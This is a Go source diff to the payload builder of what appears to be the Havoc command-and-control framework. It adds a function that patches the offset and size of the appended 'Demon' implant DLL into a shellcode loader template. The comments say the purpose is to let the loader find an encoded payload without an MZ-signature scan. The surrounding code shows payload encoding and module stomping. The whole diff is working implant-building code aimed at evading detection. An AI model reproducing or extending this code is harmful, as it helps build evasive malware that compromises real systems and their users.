@@ -3,6 +3,7 @@ package builder
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -440,6 +441,16 @@ func (b *Builder) Build() bool {
 				return false
 			}
 
+			// patch the appended-DLL offset and size into the loader template so
+			// it can locate the DLL without scanning for an MZ signature (which
+			// fails when the payload is encoded)
+			ShellcodeTemplate, err = b.PatchDllOffset(ShellcodeTemplate, len(ShellcodeTemplate), len(DllPayloadBytes))
+			if err != nil {
+				logger.Error("DLL offset patch failed: " + err.Error())
+				b.SendConsoleMessage("Error", "dll offset patch failed: "+err.Error())
+				return false
+			}
+
 			// patch in module stomping (target module + enable flag) when requested
 			if b.config.ModuleStomping {
 				ShellcodeTemplate, err = b.PatchModuleStomping(ShellcodeTemplate)
@@ -625,6 +636,36 @@ func CryptEncodeBuffer(Buffer []byte, Key []byte) {
 		Stream ^= Stream + ((Stream ^ (Stream >> 7)) * (Stream | 61))
 		Buffer[i] ^= byte((Stream ^ (Stream >> 14)) & 0xFF)
 	}
+}
+
+// PatchDllOffset overwrites the two ULONG64 markers in the shellcode loader
+// template with the appended DLL offset (= template size) and the compiled
+// Demon DLL size. The stub uses these to locate the DLL without scanning for
+// an MZ signature, which fails when the payload is encoded.
+func (b *Builder) PatchDllOffset(Template []byte, templateSize, dllSize int) ([]byte, error) {
+	offsetMarker := make([]byte, 8)
+	binary.LittleEndian.PutUint64(offsetMarker, 0xD11F0D11D11F0D11)
+
+	sizeMarker := make([]byte, 8)
+	binary.LittleEndian.PutUint64(sizeMarker, 0xA22E1E22A22E1E22)
+
+	offsetVal := make([]byte, 8)
+	binary.LittleEndian.PutUint64(offsetVal, uint64(templateSize))
+
+	sizeVal := make([]byte, 8)
+	binary.LittleEndian.PutUint64(sizeVal, uint64(dllSize))
+
+	if !bytes.Contains(Template, offsetMarker) {
+		return nil, errors.New("dll offset marker not found in shellcode template (rebuild payloads/Shellcode)")
+	}
+	Template = bytes.ReplaceAll(Template, offsetMarker, offsetVal)
+
+	if !bytes.Contains(Template, sizeMarker) {
+		return nil, errors.New("dll size marker not found in shellcode template (rebuild payloads/Shellcode)")
+	}
+	Template = bytes.ReplaceAll(Template, sizeMarker, sizeVal)
+
+	return Template, nil
 }
 
 // PatchCryptKey replaces the loader's default key marker with the build key and
